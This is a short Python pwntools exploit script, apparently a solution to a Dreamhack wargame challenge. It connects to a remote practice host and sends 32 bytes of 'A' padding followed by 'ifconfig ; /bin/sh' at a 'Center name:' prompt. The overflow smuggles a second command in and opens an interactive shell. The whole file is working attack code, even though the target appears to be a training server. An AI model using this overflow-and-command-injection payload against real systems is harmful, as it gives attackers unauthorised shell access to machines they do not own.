from pwn import *

p=remote("host3.dreamhack.games",8585)

payload=b"A"*0x20+b"ifconfig ; /bin/sh"

p.sendlineafter(b"Center name: ",payload)

p.interactive()